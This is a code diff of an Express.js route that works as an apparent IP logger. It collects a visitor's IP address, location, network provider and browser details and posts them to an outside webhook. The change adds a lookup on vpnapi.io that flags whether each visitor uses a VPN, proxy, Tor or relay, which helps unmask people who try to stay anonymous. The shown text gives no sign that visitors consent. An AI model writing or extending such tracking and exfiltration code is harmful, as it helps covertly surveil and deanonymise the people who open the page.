@@ -12,11 +12,13 @@ const hook = new Webhook(process.env.WEBHOOK_URI);
 const d = new Date();
 let date = d.toDateString();
 
-router.get("/", (req, res, next) => {
+router.get("/", async (req, res, next) => {
   res.render('index')
 });
 
 router.post("/collect-info", async (req, res) => {
+  const ip = req.headers["x-forwarded-for"]
+  const response = await axios.get(`https://vpnapi.io/api/${ip}?key=${process.env.VPNAPI_KEY}`)
   const data = req.body;
   const embedData = {
     embeds: [
@@ -36,7 +38,8 @@ router.post("/collect-info", async (req, res) => {
           url: "https://files.catbox.moe/lpsllj.png",
         },
         fields: [
-          { name: "IP Address", value: `${req.headers["x-forwarded-for"]}` },
+          { name: "IP Address", value: `${ip}` },
+          { name: "VPN", value: `${response.data.security.vpn}` },
           { name: "Country", value: `${data.detailedInfo.country}` },
           { name: "Region", value: `${data.detailedInfo.regionName}` },
           {
@@ -49,6 +52,9 @@ router.post("/collect-info", async (req, res) => {
           { name: "Autonomous System", value: `${data.detailedInfo.as}` },
           { name: "Browser Name", value: `${data.browserInfo.name}` },
           { name: "Platform Name", value: `${data.browserInfo.name}` },
+          { name: "Proxy", value: `${response.data.security.proxy}`},
+          {name: "Tor", value: `${response.data.security.tor}`},
+          {name: "Relay", value: `${response.data.security.relay}`},
           {
             name: "Mobile/Tablet",
             value: `${
